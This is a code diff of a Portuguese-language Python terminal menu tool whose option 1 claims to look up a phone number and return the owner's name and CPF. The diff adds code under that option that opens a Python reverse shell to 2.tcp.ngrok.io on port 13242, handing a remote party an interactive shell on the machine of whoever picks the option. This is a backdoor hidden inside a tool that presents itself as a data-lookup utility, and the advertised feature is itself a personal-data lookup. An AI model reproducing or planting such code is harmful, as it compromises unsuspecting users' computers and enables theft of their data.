@@ -1,4 +1,3 @@
-
 #####################
 # FUNÇÕES & MODULOS #
 #####################
@@ -35,11 +34,13 @@ while True:
 	print(f'              {C}{R}BY LIPEZIN {C}')
 	print(f'   //--==--==--==--==--==--==--==--==--==--==--\\')
 	print(f'   11                                         11')
-	print(f'   11 {C}[{G}01{C}]{R} CONSULTA NÚMERO{C}]{C} 11')
+	print(f'   11 {C}[{G}01{C}]{R} CONSULTA NUMERO {C}[{G}PEGAR NOME +CPF {C}]{C} 11')
+	
 	print(f'   11                                         11')
 	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
 	choice = input(f'\n\n\n{R}   QUAL OPCAO VC DESEJA?>>>{C} ')
 	
 	
 	if choice == '1':
-		        os.system(''' python -c 'import
+		        os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",13242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+^C ''')
